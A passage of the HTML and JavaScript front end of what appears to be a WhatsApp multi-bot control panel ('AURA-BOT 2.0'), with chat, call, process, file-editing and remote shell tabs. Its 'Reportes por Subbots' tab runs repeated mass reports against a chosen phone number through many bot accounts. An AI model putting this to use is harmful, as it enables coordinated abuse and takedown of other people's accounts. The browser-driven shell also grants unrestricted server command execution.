textarea{font-family:monospace;min-height:260px;resize:vertical}.flex-row{display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:10px}
.pill{display:inline-block;padding:2px 7px;border-radius:6px;font-size:10px;font-weight:800}.pill-on{background:rgba(0,230,118,.15);color:var(--ok)}.pill-off{background:rgba(255,42,84,.15);color:var(--danger)}
.cmd-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:8px;margin-top:10px}.cmd-item{background:#0b0e17;border:1px solid var(--border);padding:7px 9px;border-radius:8px;display:flex;justify-content:space-between;align-items:center;font-size:12px}
pre{background:#05070b;border:1px solid var(--border);padding:12px;border-radius:8px;overflow-x:auto;font-size:12px;color:var(--ok);max-height:300px}
.wa-wrap{display:grid;grid-template-columns:350px 1fr;height:calc(100dvh - 114px);min-height:500px;background:var(--wabg);border:1px solid #222e35;border-radius:12px;overflow:hidden;position:relative}
.wa-side{background:var(--wap);border-right:1px solid #222e35;display:flex;flex-direction:column;height:100%;overflow:hidden}
.wa-top{padding:9px;background:#202c33;border-bottom:1px solid #222e35;display:flex;flex-direction:column;gap:7px}
.wa-row{display:flex;gap:6px;align-items:center}.wa-chip{background:#202c33;color:var(--mut);border:1px solid #2a3942;padding:4px 9px;border-radius:99px;font-size:11px;font-weight:700;cursor:pointer;white-space:nowrap}.wa-chip.active{background:rgba(0,168,132,.2);color:var(--wag);border-color:var(--wag)}
.wa-list{flex:1;overflow-y:auto}.wa-item{padding:10px 12px;border-bottom:1px solid rgba(134,150,160,.12);cursor:pointer;display:flex;justify-content:space-between;align-items:center;gap:10px}.wa-item:hover{background:#202c33}.wa-item.active{background:#2a3942}
.wa-av{width:40px;height:40px;border-radius:50%;background:#008069;color:#fff;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:13px;flex-shrink:0;overflow:hidden}.wa-av img{width:100%;height:100%;object-fit:cover;display:block}
.wa-meta{flex:1;min-width:0}.wa-name{font-size:13.5px;font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.wa-prev{font-size:12px;color:var(--mut);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-top:2px}
.wa-right{display:flex;flex-direction:column;align-items:flex-end;gap:4px;flex-shrink:0}.wa-time{font-size:10.5px;color:var(--mut)}.wa-unread{background:var(--wag);color:#111b21;font-size:10px;font-weight:800;padding:2px 6px;border-radius:99px}
.wa-main{display:flex;flex-direction:column;height:100%;background:var(--wabg);position:relative;overflow:hidden}
.wa-head{background:#202c33;padding:8px 11px;border-bottom:1px solid #222e35;display:flex;align-items:center;justify-content:space-between;gap:8px;min-height:56px;z-index:10}
.wa-hleft{display:flex;align-items:center;gap:8px;min-width:0;cursor:pointer;flex:1;overflow:hidden}
.wa-back{display:none;background:#2a3942;color:#fff;border:none;padding:6px 10px;border-radius:8px;font-weight:800;cursor:pointer;flex-shrink:0}
.wa-ibr{background:#2a3942;color:var(--txt);border:none;width:33px;height:33px;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;cursor:pointer;font-size:14px;flex-shrink:0}
.wa-msgs{flex:1;padding:12px 14px;overflow-y:auto;display:flex;flex-direction:column;gap:8px;background-color:#0b141a;background-image:radial-gradient(rgba(255,255,255,.03) 1px,transparent 0);background-size:22px 22px}
.wa-mrow{display:flex;flex-direction:column;max-width:78%;position:relative}.wa-mrow.in{align-self:flex-start}.wa-mrow.out{align-self:flex-end}
.wa-bub{padding:7px 10px;border-radius:10px;font-size:13.5px;line-height:1.4;position:relative;word-wrap:break-word;white-space:pre-wrap;box-shadow:0 1px 2px rgba(0,0,0,.35)}
.wa-mrow.in .wa-bub{background:var(--wain);border-top-left-radius:2px}.wa-mrow.out .wa-bub{background:var(--waout);border-top-right-radius:2px}.wa-bub.stk{background:transparent!important;box-shadow:none!important;padding:2px!important}
.wa-sender{font-size:11px;font-weight:800;color:var(--accent);margin-bottom:3px;cursor:pointer}
.wa-quote{background:rgba(0,0,0,.26);border-left:3px solid var(--wag);border-radius:6px;padding:4px 8px;margin-bottom:5px;font-size:11px;color:#cfd8dc;max-height:56px;overflow:hidden}
.wa-img{max-width:260px;width:100%;max-height:300px;border-radius:8px;object-fit:cover;display:block;margin-bottom:4px;cursor:zoom-in;background:#111b21;min-height:60px}
.wa-stk{width:135px;height:135px;object-fit:contain;display:block;cursor:pointer}.wa-vid{max-width:265px;width:100%;max-height:300px;border-radius:8px;display:block;margin-bottom:4px;background:#000}.wa-aud{width:230px;max-width:100%;height:36px;margin:3px 0}
.wa-bmeta{display:flex;align-items:center;justify-content:flex-end;gap:5px;font-size:10px;color:rgba(255,255,255,.6);margin-top:3px}
.wa-tools{display:none;gap:3px;position:absolute;top:-11px;right:4px;background:#202c33;border:1px solid #2a3942;border-radius:99px;padding:2px 6px;z-index:20}.wa-mrow.in .wa-tools{right:auto;left:4px}.wa-mrow:hover .wa-tools{display:flex}
.wa-tbtn{background:transparent;border:none;color:var(--txt);cursor:pointer;font-size:12px;padding:2px 3px}
.wa-reacts{display:inline-flex;gap:3px;background:#202c33;border:1px solid #2a3942;border-radius:99px;padding:2px 6px;font-size:11px;margin-top:-5px;align-self:flex-end;z-index:5}
.wa-rbar{display:none;background:#182229;border-top:1px solid #222e35;border-left:4px solid var(--wag);padding:7px 12px;align-items:center;justify-content:space-between;gap:8px;font-size:12px}.wa-rbar.active{display:flex}
.wa-ebar{display:none;background:#182229;border-top:1px solid #222e35;padding:7px 10px;gap:7px;flex-wrap:wrap;max-height:120px;overflow-y:auto}.wa-ebar.active{display:flex}.wa-emo{font-size:19px;cursor:pointer;padding:2px}
.wa-comp{background:#202c33;padding:8px 10px;display:flex;gap:6px;align-items:center;border-top:1px solid #222e35}.wa-comp input[type="text"]{background:#2a3942;border:none;color:var(--txt);padding:10px 12px;border-radius:10px;flex:1;font-size:14px;min-width:0}
.wa-drawer{position:absolute;top:0;right:0;width:300px;max-width:100%;height:100%;background:var(--wap);border-left:1px solid #222e35;z-index:40;display:none;flex-direction:column;overflow-y:auto;padding:14px}.wa-drawer.open{display:flex}
.modal{position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:999;display:none;align-items:center;justify-content:center;padding:14px}.modal.open{display:flex}.modal img{max-width:94vw;max-height:85vh;border-radius:10px;object-fit:contain}
.call-pop{position:fixed;bottom:16px;right:16px;background:#161f2c;border:2px solid var(--wag);border-radius:14px;padding:14px 16px;z-index:950;width:300px;box-shadow:0 16px 40px rgba(0,0,0,.75);display:none;flex-direction:column;gap:8px}.call-pop.active{display:flex}
@media(max-width:860px){.container{padding:0 5px 12px;margin:4px auto}.wa-wrap{grid-template-columns:1fr;height:calc(100dvh - 104px)}.wa-wrap.chat-open .wa-side{display:none}.wa-wrap:not(.chat-open) .wa-main{display:none}.wa-back{display:inline-flex}.wa-mrow{max-width:88%}.wa-img,.wa-vid{max-width:235px}}
</style></head><body>
<header><div class="brand">⚡ AURA-BOT 2.0 • SUITE</div><div class="wa-row"><div class="badge" id="callBadge" style="display:none;color:#ff2a54;border-color:#ff2a54">📞 Llamada</div><div class="badge" id="uptimeBadge">⏱️ 0h 0m 0s</div></div></header>
<div class="tabs">
  <button class="tab-btn active" onclick="tab('wa',this)">💬 WhatsApp Web</button>
  <button class="tab-btn" onclick="tab('calls',this)">📞 Llamadas <span id="callPill" class="pill pill-on" style="display:none">0</span></button>
  <button class="tab-btn" onclick="tab('dash',this)">📊 Clúster</button>
  <button class="tab-btn" onclick="tab('procs',this)">💀 Procesos</button>
  <button class="tab-btn" onclick="tab('cmds',this)">🛠️ Comandos</button>
  <button class="tab-btn" onclick="tab('spam',this)">🚨 Reportes</button>
  <button class="tab-btn" onclick="tab('files',this)">📁 Archivos</button>
  <button class="tab-btn" onclick="tab('bench',this)">⚡ Benchmark</button>
</div>
<div class="container">
  <div id="tab-wa" class="section active">
    <div class="wa-wrap" id="waWrap">
      <div class="wa-side">
        <div class="wa-top">
          <div class="wa-row"><select id="botSel" onchange="selectBot()" style="flex:1;font-weight:700"></select><button class="btn btn-wa" onclick="syncGroups()">🔄</button></div>
          <div class="wa-row"><input id="chatSearch" placeholder="Buscar chat o número..." oninput="renderChats(true)"><button class="btn" onclick="newChat()">➕</button></div>
          <div class="wa-row" style="overflow-x:auto"><button class="wa-chip active" onclick="setFilter('all',this)">Todos</button><button class="wa-chip" onclick="setFilter('unread',this)">No leídos</button><button class="wa-chip" onclick="setFilter('groups',this)">Grupos</button><button class="wa-chip" onclick="setFilter('direct',this)">Privados</button></div>
        </div>
        <div class="wa-list" id="chatList"></div>
      </div>
      <div class="wa-main">
        <div class="wa-head">
          <div class="wa-hleft" onclick="toggleDrawer()">
            <button class="wa-back" onclick="event.stopPropagation();closeChat()">⬅</button>
            <div class="wa-av" id="actAv">?</div>
            <div style="min-width:0;flex:1;overflow:hidden"><div class="wa-name" id="actName">Selecciona un chat</div><div class="wa-prev" id="actJid">Elige un Subbot arriba</div></div>
          </div>
          <div class="wa-row" id="headActs" style="display:none"><button class="wa-ibr" onclick="callChat(false)">📞</button><button class="wa-ibr" onclick="callChat(true)">📹</button><button class="wa-ibr" onclick="toggleDrawer()">ℹ️</button></div>
        </div>
        <div class="wa-msgs" id="msgBox"><div style="margin:auto;text-align:center;color:var(--mut);padding:20px;max-width:380px"><h3 style="color:var(--txt);margin-bottom:6px">📱 WhatsApp Web Multi-Subbot</h3><p style="font-size:13px">Soporte completo de imágenes, stickers, audios y videos con streaming directo.</p></div></div>
        <div class="wa-rbar" id="replyBar"><div style="min-width:0;flex:1"><div style="font-weight:800;color:var(--wag)" id="repWho"></div><div style="color:var(--mut);white-space:nowrap;overflow:hidden;text-overflow:ellipsis" id="repTxt"></div></div><button class="wa-ibr" style="width:26px;height:26px" onclick="cancelReply()">✖</button></div>
        <div class="wa-ebar" id="emoBar"></div>
        <form class="wa-comp" onsubmit="sendMsg(event)">
          <button type="button" class="wa-ibr" onclick="el('emoBar').classList.toggle('active')">😀</button>
          <button type="button" class="wa-ibr" onclick="el('fileInp').click()">📎</button>
          <input type="file" id="fileInp" style="display:none" accept="image/*,video/*,audio/*,.webp,.pdf,.zip" onchange="uploadMedia(event)">
          <input type="text" id="msgInp" placeholder="Escribe un mensaje..." autocomplete="off" oninput="onTyping()">
          <button type="button" class="wa-ibr" id="micBtn" onclick="recVoice()">🎤</button>
          <button type="submit" class="btn btn-wa" style="padding:9px 13px;border-radius:10px">➤</button>
        </form>
        <div class="wa-drawer" id="infoDrawer">
          <div class="flex-row" style="justify-content:space-between;border-bottom:1px solid #222e35;padding-bottom:8px"><h4>ℹ️ Opciones</h4><button class="wa-ibr" style="width:28px;height:28px" onclick="toggleDrawer()">✖</button></div>
          <div style="display:flex;flex-direction:column;align-items:center;text-align:center;padding:12px 0;gap:8px">
            <div class="wa-av" id="drwAv" style="width:72px;height:72px;font-size:22px">?</div>
            <div style="font-size:15px;font-weight:800" id="drwName">-</div><div style="font-size:11px;color:var(--mut)" id="drwJid">-</div>
            <div style="font-size:12px;color:var(--accent);background:#182229;padding:7px 10px;border-radius:8px;width:100%" id="drwBio"></div>
          </div>
          <div style="display:flex;flex-direction:column;gap:7px">
            <button class="btn btn-wa" onclick="callChat(false)">📞 Llamada de Voz</button>
            <button class="btn" onclick="callChat(true)">📹 Videollamada</button>
            <button class="btn btn-ghost" onclick="sendAct('presence',{presence:'composing'})">✍️ Simular Escribiendo</button>
            <button class="btn btn-warn" onclick="promptSticker()">🏷️ Enviar URL como Sticker</button>
            <button class="btn btn-ghost" onclick="clearChat()">🗑️ Vaciar Chat Local</button>
            <button class="btn btn-danger" onclick="sendAct('block')">🚫 Bloquear</button>
            <button class="btn btn-success" onclick="sendAct('unblock')">✅ Desbloquear</button>
          </div>
        </div>
      </div>
    </div>
  </div>
  <div id="tab-calls" class="section">
    <div class="card" style="margin-bottom:12px">
      <div class="flex-row" style="justify-content:space-between"><h3>📞 Central de Llamadas & Anti-Call</h3><button class="btn" id="btnAutoRej" onclick="callApi({action:'toggle-autoreject'})">🛡️ Auto-Rechazar: OFF</button></div>
      <div class="flex-row"><input id="rejMsgInp" placeholder="Mensaje al rechazar llamada..." style="flex:1"><button class="btn btn-success" onclick="callApi({action:'set-message',message:el('rejMsgInp').value});alert('Guardado')">💾 Guardar</button></div>
      <div class="flex-row" style="margin-top:8px"><select id="callBotSel" style="max-width:220px"></select><input id="callTarget" placeholder="Número o JID (ej: 573001234567)" style="max-width:240px"><select id="callType" style="max-width:140px"><option value="voice">📞 Voz</option><option value="video">📹 Video</option></select><button class="btn btn-wa" onclick="manualCall()">🚀 Llamar</button></div>
    </div>
    <div class="card"><div class="flex-row" style="justify-content:space-between"><h3>📋 Historial de Llamadas</h3><button class="btn btn-ghost" onclick="callApi({action:'clear-logs'})">🗑️ Limpiar</button></div><div class="table-wrap"><table><thead><tr><th>Hora</th><th>Subbot</th><th>Contacto</th><th>Tipo</th><th>Estado</th><th>Acción</th></tr></thead><tbody id="callsTb"></tbody></table></div></div>
  </div>
  <div id="tab-dash" class="section">
    <div class="grid">
      <div class="card"><div class="card-title">Instancias</div><div class="card-val" id="mSubs">0</div><div class="card-sub" id="mSubSt">Operando</div></div>
      <div class="card"><div class="card-title">Mensajes RX / TX</div><div class="card-val" id="mMsgs">0 / 0</div><div class="card-sub">Tiempo real</div></div>
      <div class="card"><div class="card-title">Grupos</div><div class="card-val" id="mGrps">0</div><div class="card-sub">En memoria</div></div>
      <div class="card"><div class="card-title">RAM (RSS / Heap)</div><div class="card-val" id="mRam">0 MB</div><div class="card-sub" id="mCpu">CPU: 0.00</div></div>
    </div>
    <div class="card"><div class="flex-row" style="justify-content:space-between"><h3>🤖 Nodos Conectados</h3><div class="wa-row"><button class="btn btn-warn" id="btnPauseAll" onclick="api('toggle-subbots','POST',{}).then(refreshStatus)">⏸️ Pausar Todos</button><button class="btn btn-success" onclick="cleanRam()">🧹 Limpiar RAM</button></div></div><div class="table-wrap"><table><thead><tr><th>#</th><th>Número</th><th>Nombre</th><th>Estado</th><th>Rol</th><th>Acciones</th></tr></thead><tbody id="subsTb"></tbody></table></div></div>
  </div>
  <div id="tab-procs" class="section"><div class="card"><div class="flex-row" style="justify-content:space-between"><h3>💀 Procesos & RAM</h3><div class="wa-row"><input id="pidsInp" placeholder="PIDs (ej: 1204,1502)" style="width:180px"><button class="btn btn-danger" onclick="killPids()">Matar</button><button class="btn btn-success" onclick="cleanRam()">Forzar GC</button></div></div><div class="table-wrap"><table><thead><tr><th>PID</th><th>Proceso</th><th>%CPU</th><th>%MEM</th><th>Acción</th></tr></thead><tbody id="procsTb"></tbody></table></div></div></div>
  <div id="tab-cmds" class="section"><div class="card"><h3>🛠️ Mantenimiento de Comandos</h3><div class="flex-row" style="margin-top:8px"><input id="cmdInp" placeholder="Comando (ej: play, sticker)" style="max-width:260px"><button class="btn btn-danger" onclick="toggleCmd(el('cmdInp').value.trim().replace(/^[.#/]/,''));el('cmdInp').value=''">Alternar</button></div><div class="cmd-grid" id="cmdGrid"></div></div></div>
  <div id="tab-spam" class="section"><div class="card"><h3>🚨 Reportes por Subbots</h3><div class="flex-row" style="margin-top:8px"><input id="spamPhone" placeholder="Número (ej: 573001234567)" style="max-width:240px"><input type="number" id="spamCyc" value="5" min="1" max="20" style="max-width:90px"><button class="btn btn-danger" onclick="runSpam()">🚀 Ejecutar</button></div><div class="table-wrap"><table><thead><tr><th>Objetivo</th><th>Reportes</th><th>Subbots</th><th>Hora</th></tr></thead><tbody id="spamTb"></tbody></table></div></div></div>
  <div id="tab-files" class="section"><div class="card"><h3>📁 Archivos & Editor</h3><div class="flex-row" style="margin-top:8px"><input id="dirInp" value="." style="max-width:280px"><button class="btn" onclick="loadDir()">📂 Listar</button></div><div id="fileList" style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:10px"></div><div class="flex-row" style="justify-content:space-between"><input id="editPath" readonly placeholder="Archivo abierto..." style="max-width:380px"><button class="btn btn-success" onclick="saveFile()">💾 Guardar</button></div><textarea id="fileEd" placeholder="Selecciona un archivo..."></textarea></div></div>
  <div id="tab-bench" class="section"><div class="card"><h3>⚡ Benchmark V8 & Shell</h3><div class="flex-row" style="margin-top:8px"><button class="btn" onclick="runBench()">🔥 Ejecutar Benchmark</button></div><pre id="benchOut">Listo...</pre><div class="flex-row" style="margin-top:12px"><input id="shInp" placeholder="Comando (ej: df -h, free -m)" style="max-width:380px"><button class="btn btn-warn" onclick="runSh()">Ejecutar</button></div><pre id="shOut">Listo...</pre></div></div>
</div>
<div class="modal" id="lightbox" onclick="this.classList.remove('open')"><img id="lbImg" src=""></div>
<div class="call-pop" id="callPop"><div style="display:flex;justify-content:space-between"><b style="color:var(--wag);font-size:12px" id="cpType">📞 LLAMADA</b><span style="font-size:11px;color:var(--mut)" id="cpBot"></span></div><div style="font-size:15px;font-weight:800" id="cpName"></div><div style="font-size:11px;color:var(--mut)" id="cpJid"></div><div class="wa-row"><button class="btn btn-danger" style="flex:1" onclick="rejPopCall()">📵 Cortar</button><button class="btn btn-wa" style="flex:1" onclick="openPopChat()">💬 Chat</button></div></div>
<script>
const TOKEN="${token}",el=id=>document.getElementById(id),esc=s=>String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
let botKey="",chatJid="",filterMode="all",chats=[],msgs=[],bots=[],replyMsg=null,popCall=null,rec=null,chunks=[],lastTyp=0,upSec=0,busySt=false,busyCh=false,busyMs=false,sigCh="",sigMs="";
const EMOJIS=["😂","❤️","🔥","👍","😭","🙏","😍","🥰","🤣","😊","😎","🙌","💀","👀","✨","🎉","💯","😡","🤔","👏","🫡","⚡","🚀","👑","✅","❌"];
el('emoBar').innerHTML=EMOJIS.map(e=>'<span class="wa-emo" onclick="el(\\'msgInp\\').value+=\\''+e+'\\';el(\\'msgInp\\').focus()">'+e+'</span>').join('');
setInterval(()=>{if(upSec>0){upSec++;const h=Math.floor(upSec/3600),m=Math.floor((upSec%3600)/60),s=upSec%60;el('uptimeBadge').textContent='⏱️ '+h+'h '+m+'m '+s+'s';}},1000);

function tab(id,b){document.querySelectorAll('.section').forEach(s=>s.classList.remove('active'));document.querySelectorAll('.tab-btn').forEach(x=>x.classList.remove('active'));el('tab-'+id).classList.add('active');if(b)b.classList.add('active');if(id==='files')loadDir();if(id==='cmds')loadCmds();if(id==='wa')refreshChats(true);if(id==='procs')loadProcs();}
async function api(p,m='GET',body=null,ms=7000){const c=new AbortController(),t=setTimeout(()=>c.abort(),ms);try{const o={method:m,headers:{'Content-Type':'application/json','x-aura-token':TOKEN},signal:c.signal};if(body)o.body=JSON.stringify(body);const r=await fetch('/api/'+p+(p.includes('?')?'&':'?')+'token='+TOKEN,o);return await r.json();}finally{clearTimeout(t);}}
function avHtml(name,jid,isG,url){const ini=(name||'?').replace(/[^a-zA-Z0-9]/g,'').slice(0,2).toUpperCase()||(isG?'👥':'👤');const u=url||('/api/wa-avatar?botKey='+encodeURIComponent(botKey)+'&jid='+encodeURIComponent(jid)+'&token='+TOKEN);return '<img src="'+esc(u)+'" loading="lazy" onerror="this.style.display=\\'none\\';this.parentNode.textContent=\\''+esc(ini)+'\\'">';}

async function refreshStatus(){
  if(busySt)return;busySt=true;
  try{
    const d=await api('status','GET',null,4500);
    if(typeof d.uptimeSec==='number')upSec=d.uptimeSec;
    el('mSubs').textContent=d.subbots.length;el('mSubSt').textContent=d.subbotsPaused?'⏸️ PAUSADOS':'🟢 OPERANDO';
    el('btnPauseAll').textContent=d.subbotsPaused?'▶️ Reanudar Todos':'⏸️ Pausar Todos';
    el('mMsgs').textContent=d.msgRx+' / '+d.msgTx;el('mGrps').textContent=d.groupsCount;
    el('mRam').textContent=d.ramRss+' / '+d.ramHeap+' MB';el('mCpu').textContent='CPU: '+d.loadAvg;
    bots=d.subbots||[];
    const sel=el('botSel'),csel=el('callBotSel'),prev=sel.value||botKey;
    const opts=bots.map((s,i)=>'<option value="'+esc(s.id)+'">'+esc((i===0?'👑 Main: ':'🤖 Sub #'+i+': ')+s.name+' (+'+s.id+')')+'</option>').join('');
    if(sel.dataset.sig!==opts){sel.dataset.sig=opts;sel.innerHTML=opts;csel.innerHTML=opts;if(prev&&bots.some(b=>b.id===prev)){sel.value=prev;botKey=prev;}else if(bots[0]){botKey=bots[0].id;sel.value=botKey;}}
    el('subsTb').innerHTML=bots.map((s,i)=>'<tr><td>#'+(i+1)+'</td><td><code>+'+esc(s.id)+'</code></td><td>'+esc(s.name)+'</td><td><span class="pill '+(s.paused?'pill-off':'pill-on')+'">'+(s.paused?'PAUSADO':'ONLINE')+'</span></td><td>'+esc(s.role)+'</td><td><button class="btn btn-wa" style="padding:4px 8px;margin-right:4px" onclick="jumpBot(\\''+esc(s.id)+'\\')">💬 Chats</button><button class="btn '+(s.paused?'btn-success':'btn-warn')+'" style="padding:4px 8px" onclick="api(\\'toggle-single-bot\\',\\'POST\\',{botKey:\\''+esc(s.id)+'\\'}).then(refreshStatus)">'+(s.paused?'▶️':'⏸️')+'</button></td></tr>').join('');
    el('spamTb').innerHTML=(d.reports||[]).length?d.reports.map(r=>'<tr><td><code>+'+esc(r.phone)+'</code></td><td><b>'+r.totalReports+'</b></td><td>'+r.subbotsCount+'</td><td>'+esc(r.lastTimestamp)+'</td></tr>').join(''):'<tr><td colspan="4" style="color:var(--mut)">Sin registros.</td></tr>';
    renderCalls(d.calls||[],d.autoRejectCalls,d.autoRejectMessage);
  }catch{}finally{busySt=false;}
}

function renderCalls(calls,autoRej,autoMsg){
  const pill=el('callPill');pill.style.display=calls.length?'inline-block':'none';pill.textContent=calls.length;
  el('btnAutoRej').textContent=autoRej?'🛡️ Auto-Rechazar: ON':'🛡️ Auto-Rechazar: OFF';
  el('btnAutoRej').className='btn '+(autoRej?'btn-success':'btn-warn');
  if(document.activeElement!==el('rejMsgInp')&&autoMsg)el('rejMsgInp').value=autoMsg;
  el('callsTb').innerHTML=calls.length?calls.map(c=>'<tr><td>'+esc(c.timeStr)+'</td><td><code>+'+esc(c.botKey)+'</code></td><td><b>'+esc(c.peerName)+'</b><br><span style="color:var(--mut);font-size:10px">'+esc(c.peerJid)+'</span></td><td>'+(c.isVideo?'📹 Video':'📞 Voz')+'</td><td><span class="pill '+(c.status==='reject'?'pill-off':'pill-on')+'">'+esc(c.status.toUpperCase())+'</span></td><td><button class="btn btn-danger" style="padding:4px 7px;margin-right:4px" onclick="callApi({action:\\'reject\\',botKey:\\''+esc(c.botKey)+'\\',callId:\\''+esc(c.id)+'\\',peerJid:\\''+esc(c.peerJid)+'\\'})">📵</button><button class="btn btn-wa" style="padding:4px 7px" onclick="jumpCallChat(\\''+esc(c.botKey)+'\\',\\''+esc(c.peerJid)+'\\')">💬</button></td></tr>').join(''):'<tr><td colspan="6" style="color:var(--mut);text-align:center">Sin llamadas registradas.</td></tr>';
  const off=calls.find(c=>(c.status==='offer'||c.status==='ringing')&&(Date.now()-c.timestamp<28000));
  if(off){popCall=off;el('cpType').textContent=off.isVideo?'📹 VIDEOLLAMADA':'📞 LLAMADA DE VOZ';el('cpBot').textContent='+'+off.botKey;el('cpName').textContent=off.peerName;el('cpJid').textContent=off.peerJid;el('callPop').classList.add('active');el('callBadge').style.display='inline-block';}
  else{popCall=null;el('callPop').classList.remove('active');el('callBadge').style.display='none';}
}

async function callApi(b){await api('wa-call','POST',b);refreshStatus();}
function rejPopCall(){if(popCall)callApi({action:'reject',botKey:popCall.botKey,callId:popCall.id,peerJid:popCall.peerJid});}
function openPopChat(){if(popCall)jumpCallChat(popCall.botKey,popCall.peerJid);}
function jumpCallChat(bKey,jid){jumpBot(bKey);openChat(jid);}
async function manualCall(){const bKey=el('callBotSel').value||botKey,raw=el('callTarget').value.trim(),isVideo=el('callType').value==='video';if(!raw)return;const peerJid=raw.includes('@')?raw:raw.replace(/\\D/g,'')+'@s.whatsapp.net';await callApi({action:'offer',botKey:bKey,peerJid,isVideo});alert('Llamada iniciada');}
async function callChat(isVideo){if(botKey&&chatJid){await callApi({action:'offer',botKey,peerJid:chatJid,isVideo});loadMsgs(chatJid,true,true);}}

function jumpBot(k){botKey=k;el('botSel').value=k;chatJid="";sigCh="";sigMs="";tab('wa',document.querySelector('.tab-btn'));}
function selectBot(){botKey=el('botSel').value;chatJid="";sigCh="";sigMs="";closeChat();el('chatList').innerHTML='<div style="padding:20px;text-align:center;color:var(--accent)">⚡ Cargando +'+esc(botKey)+'...</div>';refreshChats(true);}
function setFilter(m,b){filterMode=m;document.querySelectorAll('.wa-chip').forEach(c=>c.classList.remove('active'));b.classList.add('active');renderChats(true);}
async function syncGroups(){if(botKey){await api('wa-sync','POST',{botKey});setTimeout(()=>refreshChats(true),600);}}

async function refreshChats(force=false){
  if(busyCh&&!force)return;if(!botKey&&bots[0])botKey=bots[0].id;if(!botKey)return;busyCh=true;
  try{const d=await api('wa-chats?botKey='+encodeURIComponent(botKey),'GET',null,4500);chats=d.chats||[];renderChats(force);if(chatJid)await loadMsgs(chatJid,false,force);}catch{}finally{busyCh=false;}
}

function renderChats(force=false){
  const q=(el('chatSearch').value||'').toLowerCase().trim();
  const list=chats.filter(c=>(filterMode==='all'||(filterMode==='unread'&&c.unread>0)||(filterMode==='groups'&&c.isGroup)||(filterMode==='direct'&&!c.isGroup))&&(c.name.toLowerCase().includes(q)||c.jid.toLowerCase().includes(q)||(c.lastPreview||'').toLowerCase().includes(q)));
  const sig=botKey+'|'+chatJid+'|'+filterMode+'|'+q+'|'+list.map(c=>c.jid+':'+c.lastTime+':'+c.unread+':'+c.lastPreview).join(',');
  if(!force&&sig===sigCh)return;sigCh=sig;
  if(!list.length){el('chatList').innerHTML='<div style="padding:22px;text-align:center;color:var(--mut);font-size:12px">Sin conversaciones. Pulsa 🔄 o ➕.</div>';return;}
  el('chatList').innerHTML=list.slice(0,110).map(c=>'<div class="wa-item '+(c.jid===chatJid?'active':'')+'" onclick="openChat(\\''+esc(c.jid)+'\\')"><div class="wa-av" style="background:'+(c.isGroup?'#5e35b1':'#008069')+'">'+avHtml(c.name,c.jid,c.isGroup,c.avatarUrl)+'</div><div class="wa-meta"><div class="wa-name">'+esc(c.name)+'</div><div class="wa-prev">'+esc(c.lastPreview||c.jid)+'</div></div><div class="wa-right"><div class="wa-time">'+(c.lastTime?new Date(c.lastTime).toLocaleTimeString([],{hour:'2-digit',minute:'2-digit'}):'')+'</div>'+(c.unread>0?'<span class="wa-unread">'+c.unread+'</span>':'')+'</div></div>').join('');
}

async function openChat(jid){chatJid=jid;sigMs="";cancelReply();el('waWrap').classList.add('chat-open');el('headActs').style.display='flex';renderChats(true);await loadMsgs(jid,true,true);}
function closeChat(){el('waWrap').classList.remove('chat-open');el('infoDrawer').classList.remove('open');}
function toggleDrawer(){if(chatJid)el('infoDrawer').classList.toggle('open');}

async function loadMsgs(jid,scroll=false,force=false){
  if((busyMs&&!force)||!botKey||!jid)return;busyMs=true;
  try{
    const d=await api('wa-messages?botKey='+encodeURIComponent(botKey)+'&jid='+encodeURIComponent(jid),'GET',null,4500);
    if(!d.chat)return;
    msgs=d.chat.messages||[];
    const sig=botKey+'|'+jid+'|'+msgs.map(m=>m.id+':'+m.text+':'+Object.values(m.reactions||{}).join('')).join(',');
    if(!force&&sig===sigMs)return;sigMs=sig;

    el('actName').textContent=d.chat.name||jid;el('actJid').textContent='+'+botKey+' • '+d.chat.jid;
    el('actAv').innerHTML=avHtml(d.chat.name,d.chat.jid,d.chat.isGroup,d.chat.avatarUrl);
    el('drwName').textContent=d.chat.name||jid;el('drwJid').textContent=d.chat.jid;
    el('drwBio').textContent=d.chat.statusText||(d.chat.isGroup?'Grupo activo':'Cuenta de WhatsApp');
    el('drwAv').innerHTML=avHtml(d.chat.name,d.chat.jid,d.chat.isGroup,d.chat.avatarUrl);

    const box=el('msgBox'),nearBot=box.scrollHeight-box.scrollTop-box.clientHeight<150;
    if(!msgs.length){box.innerHTML='<div style="margin:auto;color:var(--mut);font-size:12px;text-align:center;background:#111b21;padding:12px 18px;border-radius:10px">🔒 Envía o recibe un mensaje para verlo en tiempo real.</div>';return;}

    box.innerHTML=msgs.map(m=>{
      const side=m.fromMe?'out':'in',isStk=m.mediaType==='sticker';
      const sender=(!m.fromMe&&d.chat.isGroup&&!isStk)?'<div class="wa-sender" onclick="el(\\'msgInp\\').value+=\\'@'+esc(m.sender)+' \\';el(\\'msgInp\\').focus()">'+esc(m.pushName||'+'+m.sender)+'</div>':'';
      const quote=m.quotedText?'<div class="wa-quote"><b style="color:var(--wag)">'+esc(m.quotedSender?'+'+m.quotedSender:'Cita')+'</b><div>'+esc(m.quotedText)+'</div></div>':'';
      const mUrl='/api/media?id='+encodeURIComponent(m.id)+'&botKey='+encodeURIComponent(botKey)+'&token='+TOKEN;
      const tUrl='/api/thumb?id='+encodeURIComponent(m.id)+'&token='+TOKEN;
      let media='';
      if(m.mediaType==='image')media='<img class="wa-img" src="'+mUrl+'" loading="lazy" onclick="el(\\'lbImg\\').src=\\''+mUrl+'\\';el(\\'lightbox\\').classList.add(\\'open\\')">';
      else if(isStk)media='<img class="wa-stk" src="'+mUrl+'" loading="lazy" onclick="el(\\'lbImg\\').src=\\''+mUrl+'\\';el(\\'lightbox\\').classList.add(\\'open\\')">';
      else if(m.mediaType==='video')media='<video class="wa-vid" controls playsinline preload="metadata" poster="'+tUrl+'" src="'+mUrl+'"></video>';
      else if(m.mediaType==='audio')media='<audio class="wa-aud" controls preload="metadata" src="'+mUrl+'"></audio>';
      const rList=Object.values(m.reactions||{});
